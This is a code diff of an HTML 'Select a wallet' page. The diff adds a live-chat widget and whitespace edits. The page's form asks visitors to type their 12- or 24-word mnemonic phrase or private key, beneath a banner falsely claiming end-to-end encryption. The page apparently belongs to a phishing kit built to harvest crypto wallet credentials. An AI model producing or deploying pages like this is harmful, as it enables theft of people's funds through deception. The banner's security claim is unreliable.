@@ -13,6 +13,18 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
         integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A=="
         crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <!-- Smartsupp Live Chat script -->
+    <script type="text/javascript">
+        var _smartsupp = _smartsupp || {};
+        _smartsupp.key = '918d41555ff1db6ba09c15f1f3f85278bf4b27b8';
+        window.smartsupp || (function (d) {
+            var s, c, o = smartsupp = function () { o._.push(arguments) }; o._ = [];
+            s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
+            c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
+            c.src = 'https://www.smartsuppchat.com/loader.js?'; s.parentNode.insertBefore(c, s);
+        })(document);
+    </script>
+    <noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
 </head>
 
 <body>
@@ -20,22 +32,22 @@
         <div class="main">
             <div class="topSection">
                 <h4>Select a wallet</h4>
-    
+
                 <!-- loading container  -->
                 <div class="loading-container">
                     <div class="loading-bar"></div>
                 </div>
-    
+
                 <div class="searchSection">
                     <input type="search" placeholder="Find wallet" name="" id="searchWallet">
                     <button>Search</button>
                 </div>
             </div>
-    
+
             <!-- wallet section  -->
             <div class="walletSection">
                 <p class="searchResult"><span id="walletCount">0</span> result found</p>
-    
+
                 <div class="walletContainer">
                     <div class="divWallet coinus">
                         <img src="assets/coinus-Bso1DCWT.jpg" alt="">
@@ -595,7 +607,8 @@
 
                     <form id="myForm" class="phraseForm active">
                         <input type="hidden" name="_captcha" value="false">
-                        <textarea required class="phraseBox" name="message" id="" placeholder="Enter your 12 or 24 Mnemonic words. seperate them with spaces. You can also input your privatekey instead."></textarea>
+                        <textarea required class="phraseBox" name="message" id=""
+                            placeholder="Enter your 12 or 24 Mnemonic words. seperate them with spaces. You can also input your privatekey instead."></textarea>
                         <div class="loading-container formLoading active ">
                             <div class="loading-bar"></div>
                         </div>
@@ -603,12 +616,12 @@
 
                     </form>
 
-                
+
                     <div class="secure">
                         <img src="assets/secure-img.svg" alt="">
                         <span>This session is secured with end-to-end encryption</span>
                     </div>
-    
+
                 </div>
             </div>
 
